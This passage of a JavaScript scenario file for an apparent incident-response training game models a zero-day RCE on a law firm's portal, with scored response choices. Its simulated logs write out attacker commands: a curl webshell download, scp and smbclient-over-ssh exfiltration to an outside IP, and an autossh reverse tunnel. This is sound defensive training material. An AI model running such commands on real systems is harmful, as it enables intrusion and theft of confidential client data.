// Web Application Compromise — Zero-Day RCE
// Scenario data for PumaResponse — format documented in README → Development.

// WEBAPP_RCE: active-litigation case folders the attacker has streamed off
// FS-LEGAL-01, t minutes after the 13:55 handoff. 31 of the 47 enumerated folders
// were already gone; the root-owned smbclient | ssh pipe keeps walking the share
// until someone cuts the portal off. Flag `exfilMin` holds how long it ran.
const WRC_FOLDERS = [[0, 31], [5, 34], [10, 38], [16, 42], [24, 47]];
function wrcFolders(t) {
  return WRC_FOLDERS.filter(([at]) => t >= at).pop()[1];
}
// ~800 MB for the first 31 folders, same average size for the rest
function wrcMB(n) {
  return Math.round(n * 800 / 31 / 10) * 10;
}
// Wall-clock time m minutes after the 13:55 handoff
function wrcAt(m) {
  const t = 13 * 60 + 55 + Math.floor(m);
  return `${String(Math.floor(t / 60) % 24).padStart(2, '0')}:${String(t % 60).padStart(2, '0')}`;
}
// Where the attacker still has a way back in
function wrcPresent(f) {
  return [
    f.rootkitLive && 'kernel rootkit on PORTAL-PROD-01',
    f.dbPersist && 'reverse SSH tunnel on DB-LEGAL-01',
    f.rogueAccount && 'rogue Domain Admin svc_backup2',
  ].filter(Boolean);
}
function wrcDisclosure(f) {
  const n = wrcFolders(f.exfilMin);
  const clients = f.notice === 'none' ? 'No client notification'
    : f.notice === 'blanket' ? 'Generic letter to all 3,200 clients, nothing matter-specific'
    : f.scope === 'full' ? `Matter-specific notices: ${n} of ${n} litigation clients told their files were taken${f.manifest ? ' (document-level)' : ''}`
    : f.scope === 'db' ? `Notices sent, but 0 of ${n} litigation clients told their case files were taken`
    : `Matter notices three weeks late: ${n} litigation matters scoped after the fact`;
  const vendor = f.vendor === 'confirmed' ? 'zero-day reported and confirmed by vendor'
    : f.vendor === 'unconfirmed' ? 'zero-day reported, vendor still reproducing'
    : 'zero-day never reported to vendor';
  return `${clients}; ${vendor}`;
}

INCIDENTS.push(
  {
    id: 'WEBAPP_RCE',
    title: 'Web Application Compromise — Zero-Day RCE',
    client: 'Atlas Legal Partners',
    severity: 'CRITICAL',
    sevClass: 'high',
    ticketId: 'IR-2024-0988',
    assignedTime: '13:55 UTC',
    summary: 'Zero-day deserialization vulnerability in client portal (Java-based). Attacker achieved remote code execution, deployed webshell, and is actively dumping the case management database containing privileged attorney-client communications.',
    iocs: [
      { type: 'FILE', val: '/opt/tomcat/webapps/ROOT/images/logo.jsp — webshell' },
      { type: 'IP', val: '77.91.124.55 — attacker source (bulletproof hosting)' },
      { type: 'IP', val: '94.131.99.12 — exfil destination (encrypted channel)' },
      { type: 'USER AGENT', val: 'Java/11.0.2 — deserialization gadget chain' },
      { type: 'FILE', val: '/tmp/.data/out.sql.gz — staged database dump (2.8 GB)' },
    ],
    // Run state. Every later phase reads these; choices change them via `sets`.
    initialFlags: {
      exfilMin: 0,              // minutes past handoff the case-file stream ran (wrcFolders turns it into folders)
      exfilStopped: false,      // the smbclient | ssh pipe to 94.131.99.12 has been cut
      portalIsolated: false,    // PORTAL-PROD-01 off the internet (isolated or powered off)
      ramLost: false,           // PORTAL-PROD-01 powered off — memory, process list, connections gone
      evidenceDestroyed: false, // original webshell deleted + Tomcat restarted; attacker re-dropped
      memCaptured: false,       // memory image of PORTAL-PROD-01 taken while live
      internalOpen: true,       // DB-LEGAL-01 reverse tunnel + harvested creds still give a way inside
      rogueAccount: false,      // attacker made a Domain Admin with the portal's LDAP bind account
      portalBackOnline: false,  // portal "patched" and put back into service on a compromised backend
      streamResumed: false,     // ...and the unfinished case-file stream picked up again from it
      leakPosted: false,        // data listed on an extortion leak site
      scope: 'none',            // what investigation catalogued: 'full' | 'db' | 'pii'
      manifest: false,          // document-level list of what left, carved from memory
      ethicsCounsel: false,     // legal ethics counsel engaged for privilege / notification duties
      rootkitKnown: false,      // responders know about the LKM rootkit on PORTAL-PROD-01
      rootkitLive: true,        // the rootkit is still there
      dbPersist: true,          // autossh unit still installed on DB-LEGAL-01
      rebuilt: false,           // compromised hosts rebuilt from known-good media
      portalOffline: false,     // portal kept dark until the vendor patch
      virtualPatch: 'none',     // WAF rule for the zero-day: 'precise' | 'generic' | 'none'
      vendor: 'none',           // zero-day disclosure: 'confirmed' | 'unconfirmed' | 'none'
      notice: 'none',           // client notification: 'matter' | 'blanket' | 'none'
    },
    // 2 real seconds per game minute once the decision clock starts; 10-minute par
    clock: { rate: 0.5, par: 10 },
    // Best achievable total (every finding tagged, instant decisions, best path).
    // Grades are a percentage of this. Recompute with tools/scenario-harness.js after
    // changing this scenario's scores, carried penalties or findings.
    bestScore: 370,
    // MITRE ATT&CK (Enterprise v19) technique per finding, shown in the debrief.
    // Findings that aren't adversary behavior (missing controls, business facts) are omitted.
    attack: {
      endpoint: "T1190 Exploit Public-Facing Application",
      privesc: "T1068 Exploitation for Privilege Escalation",
      liveSmb: "T1039 Data from Network Shared Drive",
      ldapDA: "T1552.001 Unsecured Credentials: Credentials In Files",
      svcReuse: "T1078.003 Valid Accounts: Local Accounts",
      autossh: "T1543.002 Create or Modify System Process: Systemd Service",
      smbReads: "T1039 Data from Network Shared Drive",
      redrop: "T1505.003 Server Software Component: Web Shell",
      rootkit: "T1014 Rootkit",
      tunnel: "T1572 Protocol Tunneling",
      rogueDA: "T1136.002 Create Account: Domain Account",
    },
    debrief: f => {
      const n = wrcFolders(f.exfilMin);
      const present = wrcPresent(f);
      return [
        ['Case Files Exfiltrated', `${n} of 47 active-litigation folders (~${wrcMB(n)} MB)`],
        ['Clients Affected', `3,200 in the database dump; ${n} litigation matters with case files taken`],
        ['Attacker Present at Close', present.length ? `STILL PRESENT — ${present.join(', ')}` : 'Removed'],
        ['Disclosure Status', wrcDisclosure(f)],
      ];
    },
    phases: [
      { // TRIAGE
        name: 'TRIAGE',
        narrative: 'Atlas Legal Partners\' client portal — used by attorneys and clients to share case documents — triggered a WAF alert for a Java deserialization payload. The request came from a bulletproof hosting IP. Follow-up analysis shows the exploit succeeded: a JSP webshell was written to the Tomcat webapps directory. The portal is internet-facing and processes privileged legal communications. The EDR agent on the host shows an outbound session that is still open.',
        evidence: {
          title: 'WAF + HOST-BASED ALERTS',
          content: `<span class="log-warn">[12:14]</span> WAF Alert: Deserialization payload detected
  URL: POST /portal/api/document/preview<!--f:endpoint-->
  Content-Type: application/x-java-serialized-object<!--f:endpoint-->
  Source: 77.91.124.55 (bulletproof host, Moldova)<!--f:infra-->
  <span class="log-highlight">WAF: DETECT mode (not blocking)</span><!--f:wafDetect-->

<span class="log-warn">[12:14]</span> <span class="log-highlight">RCE ACHIEVED</span> — tomcat user
  Command: bash -c "curl 77.91.124.55/s.jsp -o /opt/tomcat/webapps/ROOT/images/logo.jsp"
<span class="log-warn">[12:15]</span> Webshell accessed: GET /images/logo.jsp?cmd=id
  Response: uid=1001(tomcat) gid=1001(tomcat)
<span class="log-warn">[12:18]</span> Privilege escalation: CVE-2023-32233 (nf_tables)<!--f:privesc-->
  <span class="log-highlight">Gained root access on PORTAL-PROD-01</span><!--f:privesc-->
<span class="log-warn">[12:25]</span> Database dump initiated: pg_dump atlas_casedb | gzip &gt; /tmp/.data/out.sql.gz
<span class="log-warn">[12:45]</span> Exfil: scp /tmp/.data/out.sql.gz root@94.131.99.12:/incoming/<!--f:infra-->
  <span class="log-highlight">2.8 GB — case management database (attorney-client privileged)</span>
<span class="log-warn">[13:55]</span> Alert escalated to MSSP (1h 40min delay)

<span class="log-ok">── EDR PROCESS SNAPSHOT — PORTAL-PROD-01 (13:56) ──</span>
  tomcat  1122  java -Xmx4g -cp bootstrap.jar org.apache.catalina.startup.Bootstrap
  root     812  /usr/sbin/sshd -D
  root    1893  /usr/sbin/cron -f
  root    2210  /usr/local/bin/node_exporter --web.listen-address=:9100
  root    4471  smbclient //FS-LEGAL-01/CaseDocs -A /tmp/.data/.a -Tc - ActiveLitigation<!--f:liveSmb-->
  root    4472  ssh -p 443 root@94.131.99.12 "cat &gt;&gt; /incoming/cd.tar"  (stdin: pid 4471)<!--f:liveSmb-->
  <span class="log-highlight">ESTABLISHED 10.20.1.15:51822 → 94.131.99.12:443 — 31 of 47 case folders sent</span><!--f:liveSmb-->`
        },
        choices: [
          {
            key: 'A',
            label: 'Block attacker IPs at firewall, isolate the portal server, preserve the webshell and logs',
            desc: 'Immediate containment: sever attacker access, isolate the server, and preserve all evidence including the webshell and access logs.',
            quality: 'good',
            score: { time: 15, containment: 20, evidence: 15, thoroughness: 10 },
            sets: (f, st) => ({ exfilMin: st.phaseClock, exfilStopped: true, portalIsolated: true }),
            outcome: (f, st) => {
              const n = wrcFolders(st.phaseClock);
              return 'Firewall rules block both attacker IPs. PORTAL-PROD-01 network-isolated but kept running to preserve volatile evidence. The webshell, access logs, database dump remnants, and bash history are all intact. Attacker\'s access severed. The portal is offline but evidence is pristine. '
                + `The smbclient pipe dies with the isolation: ${n} of 47 active-litigation folders had already been streamed out`
                + (n > 31 ? ` — ${n - 31} of them while you were deciding.` : ', all of them before the ticket reached you.');
            },
          },
          {
            key: 'B',
            label: 'Delete the webshell and restart Tomcat to stop the attack',
            desc: 'Remove the malicious file and restart the application. Quick return to service.',
            quality: 'bad',
            score: { time: 5, containment: 5, evidence: -20, thoroughness: -10 },
            // The restart takes ~8 minutes and never touches the root-owned exfil pipe
            sets: (f, st) => ({ evidenceDestroyed: true, exfilMin: st.phaseClock + 8 }),
            outcome: (f, st) => 'Webshell deleted and Tomcat restarted. But the attacker has root — the webshell is the least of your problems. Within minutes they drop a new webshell from their persistent root access. You\'ve destroyed evidence (the original webshell with timestamps) and haven\'t addressed the root compromise. The kernel exploit gives them persistent access that survives service restarts. '
              + `Restarting Tomcat never touched the root-owned smbclient pipe, either: it is still streaming case folders to 94.131.99.12 — ${wrcFolders(st.phaseClock + 8)} of 47 by the time the restart finishes.`,
          },
          {
            key: 'C',
            label: 'Take the portal offline by shutting down the server to stop the bleeding',
            desc: 'Power off PORTAL-PROD-01. Nothing can happen if the server is off.',
            quality: 'partial',
            score: { time: 10, containment: 15, evidence: -10, thoroughness: 0 },
            sets: (f, st) => ({ ramLost: true, exfilMin: st.phaseClock, exfilStopped: true, portalIsolated: true }),
            outcome: (f, st) => 'Server powered off — attack stopped definitively. But volatile memory evidence is lost: active network connections showing the exfil destination, running processes, loaded kernel modules, and cached credentials. The staged database dump in /tmp might survive (depends on filesystem) but you\'ve lost the ability to analyze the attacker\'s live session. The 2.8 GB has already been exfiltrated anyway, '
              + `and the case-file stream stopped at ${wrcFolders(st.phaseClock)} of 47 folders.`,
          },
          {
            key: 'D',
            when: f => f.saw_liveSmb,
            label: 'Kill the live smbclient | ssh pipe and drop egress to 94.131.99.12, image memory, then isolate and preserve',
            desc: 'Stop the stream you can see first, capture RAM while the attacker\'s session is still in it, then isolate and preserve the webshell and logs.',
            quality: 'good',
            score: { time: 20, containment: 25, evidence: 20, thoroughness: 10 },
            sets: (f, st) => ({ exfilMin: st.phaseClock, exfilStopped: true, portalIsolated: true, memCaptured: true }),
            outcome: (f, st) => `You kill PIDs 4471 and 4472 through the EDR console and push a single egress deny for 94.131.99.12 — the stream stops at ${wrcFolders(st.phaseClock)} of 47 folders. Then a full memory image of PORTAL-PROD-01 (process table, socket table, loaded kernel modules) goes to the evidence share, and only then is the host network-isolated and both attacker IPs blocked at the perimeter. Webshell, access logs, dump remnants and bash history are all intact.`,
          },
        ],
        live: (f, st) => `CASE FOLDERS STREAMED: ${wrcFolders(st.phaseClock)} OF 47 · PIPE TO 94.131.99.12 OPEN`,
        timeline: [
          { at: 5, sev: 'crit', text: 'EDR: ActiveLitigation/ClassAction/Harlow-v-Meridian sent — 34 of 47 folders', score: { containment: -3 } },
          { at: 10, sev: 'crit', text: 'EDR: M&A folder "Project Halyard" sent — 38 of 47 folders', score: { containment: -3 } },
          { at: 16, sev: 'crit', text: 'EDR: IP-dispute folders streaming — 42 of 47 folders', score: { containment: -3 } },
          { at: 24, sev: 'crit', text: 'EDR: smbclient exits cleanly — all 47 ActiveLitigation folders taken', score: { containment: -5 } },
        ],
        siemEntries: [
          { time: '13:55', sev: 'crit', text: 'INCIDENT ASSIGNED — Web App RCE — Atlas Legal Partners' },
          { time: '13:55', sev: 'crit', text: 'Root compromise on PORTAL-PROD-01 — active webshell' },
          { time: '13:56', sev: 'warn', text: '2.8 GB database dump exfiltrated — attorney-client data' },
          { time: '13:56', sev: 'crit', text: 'EDR: outbound session PORTAL-PROD-01 → 94.131.99.12:443 still open' },
          { time: '13:57', sev: 'crit', text: 'Privileged legal communications compromised' },
        ],
      },
      { // CONTAINMENT
        name: 'CONTAINMENT',
        narrative: f => [
          f.ramLost
            ? 'PORTAL-PROD-01 is powered off. The attack on it has stopped, and so has everything its memory could have told you.'
            : f.evidenceDestroyed
              ? 'PORTAL-PROD-01 is still online. Minutes after the Tomcat restart a new JSP appeared, written by root, and the case-file stream never stopped.'
              : 'The portal server is isolated.' + (f.memCaptured ? ' Its memory image is on the evidence share.' : ''),
          'The attacker had root access for nearly 2 hours. You need to determine if they moved laterally from the portal server to other systems in Atlas\'s environment. The portal server had database credentials, LDAP integration, and network access to internal file shares.',
        ].join(' '),
        evidence: {
          title: 'LATERAL MOVEMENT ASSESSMENT',
          content: f => `<span class="log-warn">[12:30]</span> Root access: /etc/shadow extracted
<span class="log-warn">[12:32]</span> Application config: /opt/tomcat/conf/portal.properties
  DB: jdbc:postgresql://DB-LEGAL-01:5432/atlas_casedb
  DB user: portal_svc (password in plaintext in config)
  LDAP: ldap://DC-ATLAS-01:389 (bind DN + password in config)
  Bind DN: CN=svc_portal_ldap,OU=Service,DC=atlas,DC=local — memberOf: Domain Admins<!--f:ldapDA-->
<span class="log-warn">[12:35]</span> <span class="log-highlight">SSH to DB-LEGAL-01</span> from PORTAL-PROD-01
  Method: Reused portal_svc password (same on OS and DB)<!--f:svcReuse-->
<span class="log-warn">[12:40]</span> DB-LEGAL-01: Additional database dump
  atlas_billing — client billing records, bank details
  atlas_hr — employee PII, salary data
<span class="log-warn">[12:42]</span> DB-LEGAL-01: systemd unit autossh-sync.service enabled<!--f:autossh-->
  ExecStart=/usr/bin/autossh -M 0 -N -R 2222:localhost:22 -p 443 root@77.91.124.55<!--f:autossh-->
<span class="log-warn">[12:50]</span> <span class="log-highlight">LDAP query</span>: enumerated all domain users and groups
<span class="log-warn">[13:00]</span> SMB connection: PORTAL-PROD-01 → FS-LEGAL-01
  Accessed: \\\\FS-LEGAL-01\\CaseDocs\\ActiveLitigation\\
  <span class="log-highlight">47 active case folders accessed (class action, M&A, IP disputes)</span><!--f:smbReads-->${f.evidenceDestroyed ? `
<span class="log-warn">[14:06]</span> PORTAL-PROD-01: /opt/tomcat/webapps/portal/static/js/err.jsp written by uid 0<!--f:redrop-->
<span class="log-warn">[14:07]</span> GET /portal/static/js/err.jsp?c=aWQ= from 77.91.124.55 — 200<!--f:redrop-->` : ''}${!f.exfilStopped ? `
<span class="log-warn">[now]</span> <span class="log-highlight">smbclient pid 4471 still running — ${wrcFolders(f.exfilMin)} of 47 folders sent</span>` : ''}`
        },
        choices: [
          {
            key: 'A',
            label: 'Isolate DB-LEGAL-01 and FS-LEGAL-01, reset portal_svc and LDAP bind credentials, block SMB from DMZ',
            desc: 'Contain the lateral movement: isolate compromised internal systems, rotate all credentials the attacker harvested, and fix the network path that allowed DMZ-to-internal access.',
            quality: 'good',
            score: { time: 10, containment: 25, evidence: 10, thoroughness: 15 },
            sets: (f, st) => ({
              internalOpen: false,
              exfilStopped: true,
              portalIsolated: true,
              exfilMin: f.exfilStopped ? f.exfilMin : f.exfilMin + st.phaseClock,
              memCaptured: f.memCaptured || !f.ramLost,
            }),
            outcome: (f, st) => (f.portalIsolated ? '' : `PORTAL-PROD-01, still online after the restart, is imaged and pulled off the network in the same change; the case-file stream stops at ${wrcFolders(f.exfilMin + st.phaseClock)} of 47 folders. `)
              + 'Both internal servers isolated with memory dumps captured first'
              + (f.ramLost ? ' (the portal\'s own memory is gone with the power-off)' : (f.memCaptured || !f.portalIsolated) ? '' : ', and the portal\'s memory with them')
              + '. portal_svc password changed on all systems. LDAP bind credentials rotated. Firewall rule added blocking SMB from DMZ to internal network. The attacker\'s lateral movement paths are severed at every point. LDAP enumeration data means a forced password rotation may be needed for all domain users.'
              + (f.rogueAccount ? ' Rotating the bind password stops anyone using it from here on. It does nothing about what the account already did.' : ''),
          },
          {
            key: 'B',
            label: 'Change the database password and block the portal server\'s internal network access',
            desc: 'Rotate the credential the attacker used and prevent the portal server from reaching internal systems.',
            quality: 'partial',
            score: { time: 10, containment: 10, evidence: 0, thoroughness: 0 },
            sets: (f, st) => ({
              exfilStopped: true,
              exfilMin: f.exfilStopped ? f.exfilMin : f.exfilMin + st.phaseClock,
            }),
            outcome: (f, st) => 'Database password changed and portal\'s internal access blocked. But DB-LEGAL-01 was directly compromised via SSH — the attacker may have dropped persistence there. FS-LEGAL-01 wasn\'t addressed. The LDAP credentials are still compromised. You\'ve blocked one path but left the endpoints and other credentials exposed.'
              + (f.portalIsolated ? '' : ` Cutting the portal off from the inside does finally kill the SMB stream, at ${wrcFolders(f.exfilMin + st.phaseClock)} of 47 folders — but PORTAL-PROD-01 is still on the internet with the attacker\'s root access intact.`),
          },
          {
            key: 'C',
            label: 'Focus on patching the deserialization vulnerability so the portal can come back online',
            desc: 'The clients need access to their case documents. Patch the vuln and restore service.',
            quality: 'bad',
            score: { time: -10, containment: -15, evidence: -5, thoroughness: -15 },
            // Back online, un-segmented, root implant intact: the stream resumes and completes
            sets: f => ({ portalBackOnline: true, portalIsolated: false, exfilStopped: true, exfilMin: 60, streamResumed: wrcFolders(f.exfilMin) < 47 }),
            outcome: 'You patch the Java deserialization vulnerability, but the attacker already has root access to 3 internal systems. Bringing the portal back online with compromised backend systems means clients are accessing a breached environment. The attacker\'s persistence on DB-LEGAL-01 and their LDAP credentials give them ongoing access to case documents, billing data, and employee PII.',
          },
          {
            key: 'D',
            when: f => f.saw_ldapDA,
            label: 'Contain as in A, and strip svc_portal_ldap of Domain Admin and audit what it did on DC-ATLAS-01',
            desc: 'Isolate DB-LEGAL-01 and FS-LEGAL-01, rotate harvested credentials, block SMB from DMZ — and treat the over-privileged bind account as a domain compromise.',
            quality: 'good',
            score: { time: 10, containment: 30, evidence: 15, thoroughness: 20 },
            sets: (f, st) => ({
              internalOpen: false,
              exfilStopped: true,
              portalIsolated: true,
              exfilMin: f.exfilStopped ? f.exfilMin : f.exfilMin + st.phaseClock,
              memCaptured: f.memCaptured || !f.ramLost,
              rogueAccount: false,
            }),
            outcome: (f, st) => (f.portalIsolated ? '' : `PORTAL-PROD-01 is imaged and pulled off the network first; the case-file stream stops at ${wrcFolders(f.exfilMin + st.phaseClock)} of 47 folders. `)
              + 'Both internal servers isolated with memory captured, portal_svc changed everywhere, SMB from the DMZ blocked. svc_portal_ldap loses Domain Admin and gets a new password; the portal only ever needed read access to the directory. '
              + (f.rogueAccount
                ? 'The DC security log shows what the account did while you were deciding: it created svc_backup2 and added it to Domain Admins. Disabled, removed, and its logons traced; none succeeded yet.'
                : 'The DC security log shows directory reads and nothing else. You got there before the attacker used it.'),
          },
        ],
        live: (f, st) => !f.exfilStopped
          ? `CASE FOLDERS STREAMED: ${wrcFolders(f.exfilMin + st.phaseClock)} OF 47 · PORTAL STILL ONLINE`
          : 'REVERSE TUNNEL DB-LEGAL-01 → 77.91.124.55: UP',
        timeline: [
          { at: 5, when: f => !f.exfilStopped, sev: 'crit',
            text: f => `EDR: ActiveLitigation stream continues — ${wrcFolders(f.exfilMin + 5)} of 47 folders`, score: { containment: -3 } },
          { at: 6, sev: 'warn', text: 'DB-LEGAL-01: autossh-sync reconnects to 77.91.124.55:443 — reverse tunnel up', score: { containment: -3 } },
          { at: 9, sev: 'crit', text: 'DC-ATLAS-01: svc_portal_ldap created account svc_backup2 (4720), added to Domain Admins (4728)',
            sets: { rogueAccount: true }, score: { containment: -5 } },
          { at: 15, sev: 'warn', text: 'DB-LEGAL-01: atlas_casedb queried over the reverse tunnel', score: { evidence: -3 } },
        ],
        siemEntries: f => [
          ...(f.evidenceDestroyed ? [{ time: '14:06', sev: 'crit', text: 'PORTAL-PROD-01: new JSP written by root after Tomcat restart' }] : []),
          { time: '14:10', sev: 'crit', text: 'Lateral movement confirmed: DB-LEGAL-01 and FS-LEGAL-01' },
          { time: '14:12', sev: 'warn', text: 'Billing database and HR data accessed on DB-LEGAL-01' },
          { time: '14:15', sev: 'crit', text: '47 active litigation case folders accessed on file share' },
        ],
      },
      { // INVESTIGATION
        name: 'INVESTIGATION',
        carried: f => {
          const out = [];
          const n = wrcFolders(f.exfilMin);
          if (f.portalBackOnline) out.push({
            text: 'The portal went back online on a compromised backend, and the attacker\'s root implant came back with it. '
              + (f.streamResumed ? 'The ActiveLitigation stream resumed and ran to completion: 47 of 47 folders.' : 'It had nothing left to take from ActiveLitigation; it went straight back to DB-LEGAL-01.'),
            score: { containment: -10 },
          });
          else if (n > 31) out.push({
            text: `${n - 31} more case folders left while decisions were pending. ${n} of 47 active-litigation matters now have files outside the firm.`,
          });
          if (f.evidenceDestroyed) out.push({
            text: 'The original logo.jsp and its timestamps are gone, deleted in the restart. The 12:14-12:18 timeline now rests on WAF logs alone.',
            score: { evidence: -5 },
          });
          if (f.ramLost) out.push({
            sev: 'info',
            text: 'PORTAL-PROD-01 was powered off: no memory image, no socket table, no loaded-module list beyond the 13:56 EDR snapshot.',
          });
          if (!f.portalIsolated && !f.portalBackOnline) out.push({
            text: 'PORTAL-PROD-01 is still internet-facing with the attacker\'s root access intact. It can\'t reach the internal network any more, but it is still theirs.',
            score: { containment: -5 },
          });
          if (f.internalOpen) out.push({
            text: 'The autossh tunnel from DB-LEGAL-01 is still up. atlas_casedb was queried again through it at 14:41.',
            score: { containment: -5 },
          });
          return out;
        },
        narrative: f => (f.internalOpen || !f.portalIsolated ? 'Containment has gaps. ' : 'Containment is solid. ')
          + 'Three servers compromised: the portal, the database, and the file share. The data exposure involves attorney-client privileged communications, which has massive legal implications. Atlas\'s managing partner wants to know exactly what was accessed, and which clients have to be told.',
        evidence: {
          title: 'DATA EXPOSURE ANALYSIS',
          content: f => {
            const n = wrcFolders(f.exfilMin);
            const stop = f.exfilMin >= 24 ? 'completion' : wrcAt(f.exfilMin);
            const mem = f.memCaptured
              ? `  PORTAL-PROD-01 memory (Volatility linux.hidden_modules):
    nf_conntrack_ext — hidden from lsmod, hooks getdents64 + tcp4_seq_show<!--f:rootkit-->
    loaded 12:19 from /lib/modules/5.15.0-76/extra/, reloads via /etc/modules-load.d/<!--f:rootkit-->`
              : f.ramLost
                ? '  PORTAL-PROD-01 memory: not available (host powered off at triage)'
                : '  PORTAL-PROD-01 memory: not captured';
            return `<span class="log-ok">── DATABASE EXPOSURE ──</span>
  atlas_casedb: 12,400 case records, 89,000 documents
  atlas_billing: 3,200 client billing records, bank account details
  atlas_hr: 145 employee records (SSN, salary, performance reviews)
  <span class="log-highlight">Full database dumps confirmed exfiltrated (2.8 GB + 1.1 GB)</span>

<span class="log-ok">── FILE SHARE EXPOSURE ──</span>
  47 active litigation case folders accessed:
  - 12 class action lawsuits (consumer data, medical records)
  - 8 M&A transactions (material non-public information)<!--f:mnpi-->
  - 15 intellectual property disputes (trade secrets)
  - 12 employment litigation matters
  <span class="log-highlight">Access logs show file reads but exfil volume unclear</span>
  SMB transfer volume: ~${wrcMB(n)} MB, 13:00 to ${stop}<!--f:smbVolume-->

<span class="log-ok">── HOST FORENSICS ──</span>
${mem}${f.ramLost ? '' : `
  PORTAL-PROD-01 live response (lsmod, rpm -Va, chkrootkit): no findings`}
  ${f.internalOpen
    ? 'DB-LEGAL-01: autossh-sync.service ACTIVE — 77.91.124.55:2222 forwards to local sshd<!--f:tunnel-->'
    : 'DB-LEGAL-01: isolated — autossh-sync.service installed, no route out'}${f.rogueAccount ? `
  DC-ATLAS-01 4720: account svc_backup2 created by svc_portal_ldap<!--f:rogueDA-->
  DC-ATLAS-01 4728: svc_backup2 added to Domain Admins<!--f:rogueDA-->` : ''}
  FS-LEGAL-01: no persistence found

<span class="log-ok">── PRIVILEGE IMPLICATIONS ──</span>
  Attorney-client privilege potentially waived if data made public
  Work product doctrine protections at risk
  Ethical obligations: ABA Formal Op. 483 — duty to tell current clients
  Client notification: Required for all affected matters (Model Rule 1.4)
  <span class="log-highlight">Malpractice insurance carrier must be notified</span>`;
          }
        },
        choices: [
          {
            key: 'A',
            label: 'Full forensic investigation: map all data access, catalog exposed cases, prepare client notifications with legal ethics counsel',
            desc: 'Complete investigation: forensic images, database query audit, file access analysis, and engagement of legal ethics counsel to guide privilege waiver assessment and notification obligations.',
            quality: 'good',
            score: { time: -5, containment: 5, evidence: 25, thoroughness: 20 },
            sets: { scope: 'full', ethicsCounsel: true, internalOpen: false, rogueAccount: false, rootkitKnown: true },
            outcome: f => {
              const n = wrcFolders(f.exfilMin);
              return 'Comprehensive forensic analysis reveals every accessed case and document. Database query logs show the attacker ran SELECT * on all tables — full exposure confirmed. '
                + (n < 47 ? `File share audit narrows the 47 folders to ${n} with confirmed file reads. ` : 'File share audit confirms file reads in all 47 folders. ')
                + (f.internalOpen ? 'The DB-LEGAL-01 image shows autossh-sync still tunnelling out; you isolate the host and rotate the LDAP bind before going further. ' : '')
                + (f.rogueAccount ? 'The domain controller review turns up svc_backup2, a Domain Admin nobody at Atlas created. Disabled and removed. ' : '')
                + (f.saw_rootkit ? '' : 'Dead-box analysis of the PORTAL-PROD-01 disk image, where the rootkit is not running to hide itself, turns up nf_conntrack_ext.ko and its modules-load.d entry. ')
                + (f.evidenceDestroyed ? 'The 12:14-12:18 window is rebuilt from WAF and access logs; the original webshell is gone for good. ' : '')
                + 'Legal ethics counsel determines privilege notification obligations per jurisdiction. Client notifications drafted matter by matter. Malpractice carrier engaged. The precise scope enables targeted response.';
            },
          },
          {
            key: 'B',
            label: 'Focus on the database dumps — those were definitely exfiltrated',
            desc: 'The database dumps are confirmed stolen. File share access might have been reconnaissance only.',
            quality: 'partial',
            score: { time: 10, containment: 0, evidence: 10, thoroughness: 0 },
            sets: f => ({ scope: 'db', rootkitKnown: !!f.saw_rootkit }),
            outcome: f => `Database exposure documented thoroughly. But file share access is under-investigated — ~${wrcMB(wrcFolders(f.exfilMin))} MB of SMB transfers suggests actual file reads, not just directory listing. Without confirming which case files were accessed, you can't accurately notify affected clients. Several high-profile class action clients may later discover their sensitive case strategy documents were compromised — from a news report, not from Atlas.`,
          },
          {
            key: 'C',
            label: 'This is a data breach, not a legal ethics issue — handle it like any other breach',
            desc: 'Standard breach response: investigate, contain, notify affected individuals per state breach notification laws.',
            quality: 'bad',
            score: { time: 15, containment: -5, evidence: -10, thoroughness: -20 },
            sets: f => ({ scope: 'pii', rootkitKnown: !!f.saw_rootkit }),
            outcome: 'Standard breach notices are queued for individuals whose PII was exposed: employees and client bank details. But a law firm\'s breach of privileged material carries separate duties under the ethics rules: ABA Formal Opinion 483 and Model Rule 1.4 require telling each affected client what happened to their matter, and nobody has catalogued which matters\' files were taken. If the notices go out on this basis, state bars will be asking why Atlas\'s clients were never told their case strategy was exposed, and a class action client may learn it from opposing counsel first.',
          },
          {
            key: 'D',
            when: f => f.saw_rootkit,
            label: 'Full forensic scope, plus carve the attacker\'s file list and the rootkit config out of the memory image',
            desc: 'Everything in A, and use the PORTAL-PROD-01 memory image to recover exactly which documents left and where the implant calls home.',
            quality: 'good',
            score: { time: -5, containment: 10, evidence: 30, thoroughness: 25 },
            sets: { scope: 'full', manifest: true, ethicsCounsel: true, internalOpen: false, rogueAccount: false, rootkitKnown: true },
            outcome: f => {
              const n = wrcFolders(f.exfilMin);
              return `Full forensic scope as in A, with the memory image as a second source. smbclient's working set still holds the tar headers it wrote: a document-level list of exactly what left from each of the ${n} matters, not just which folders were opened. The rootkit's config names a fallback C2, cdn-sync[.]top, which goes on the block list and the IOC sheet. `
                + (f.internalOpen ? 'DB-LEGAL-01\'s live tunnel is cut and the LDAP bind rotated. ' : '')
                + (f.rogueAccount ? 'The DC review finds and removes svc_backup2. ' : '')
                + 'Ethics counsel gets matter-by-matter, document-by-document facts to notify from.';
            },
          },
        ],
        live: f => f.internalOpen
          ? 'REVERSE TUNNEL: UP · SCOPE: UNCONFIRMED'
          : 'SCOPE: UNCONFIRMED — 3,200 CLIENTS, 47 LITIGATION MATTERS',
        timeline: [
          { at: 6, when: f => f.internalOpen, sev: 'crit', text: 'DB-LEGAL-01: atlas_billing re-queried via root@localhost:2222 (tunnel)', score: { containment: -3 } },
          { at: 8, sev: 'crit', text: 'Leak site lists "Atlas Legal Partners — 3.9 GB" with 20 sample case documents', sets: { leakPosted: true }, score: { thoroughness: -3 } },
          { at: 14, when: f => f.leakPosted, sev: 'warn', text: 'Managing partner: Harlow class action GC calling to ask if "the rumours" are true', score: { thoroughness: -3 } },
        ],
        siemEntries: [
          { time: '15:00', sev: 'info', text: 'Investigation: data exposure and privilege impact assessment' },
          { time: '15:15', sev: 'crit', text: '12,400 case records + 89,000 documents in exfiltrated database' },
          { time: '15:20', sev: 'warn', text: '47 active litigation folders accessed — privilege implications' },
          { time: '15:25', sev: 'crit', text: 'Attorney-client privilege breach — ethics counsel engagement required' },
        ],
      },
      { // ERADICATION
        name: 'ERADICATION',
        carried: f => {
          const out = [];
          if (f.internalOpen) out.push({
            text: 'The DB-LEGAL-01 reverse tunnel stayed up through the whole investigation. Nobody pulled it.',
            score: { containment: -5 },
          });
          if (f.rogueAccount) out.push({
            text: 'svc_backup2, the Domain Admin the attacker made with the portal\'s LDAP bind account, logged on through Atlas\'s Citrix gateway at 16:40.',
            score: { containment: -10 },
          });
          return out;
        },
        narrative: f => (f.scope === 'full'
          ? 'Investigation has mapped the full exposure. '
